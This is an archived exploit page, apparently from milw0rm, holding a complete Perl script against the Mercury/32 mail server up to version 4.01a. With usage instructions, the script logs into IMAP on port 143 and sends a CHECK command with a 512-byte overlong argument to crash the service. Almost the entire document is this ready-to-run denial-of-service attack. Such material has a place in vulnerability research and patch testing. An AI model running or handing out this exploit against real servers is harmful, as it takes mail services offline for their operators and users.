<html><head><title>Mercury/32 Mail Server <= 4.01a (check) Buffer Overflow Exploit</title></head><pre>#===== Start Mercury32_Overflow.pl =====
#
# Usage: Mercury32_Overflow.pl &lt;ip&gt; &lt;imap4 user&gt; &lt;imap4 pass&gt;
#        Mercury32_Overflow.pl 127.0.0.1 hello moto
#
# Mercury/32, v4.01a, Dec 8 2003
#
# Download:
# http://www.pmail.com/
#
#############################################################

use IO::Socket;
use strict;

my($socket) = &quot;&quot;;

if ($socket = IO::Socket::INET-&gt;new(PeerAddr =&gt; $ARGV[0],
                                    PeerPort =&gt; &quot;143&quot;,
                                    Proto    =&gt; &quot;TCP&quot;))
{
        print &quot;Attempting to kill Mercury/32 service at $ARGV[0]:143...&quot;;

        sleep(1);

        print $socket &quot;0000 LOGIN $ARGV[1] $ARGV[2]\r\n&quot;;

        sleep(1);

        print $socket &quot;0001 CHECK &quot; . &quot;A&quot; x 512 . &quot;\r\n&quot;;

        close($socket);
}
else
{
        print &quot;Cannot connect to $ARGV[0]:143\n&quot;;
}
#===== End Mercury32_Overflow.pl =====

# milw0rm.com [2004-12-01]</pre></html>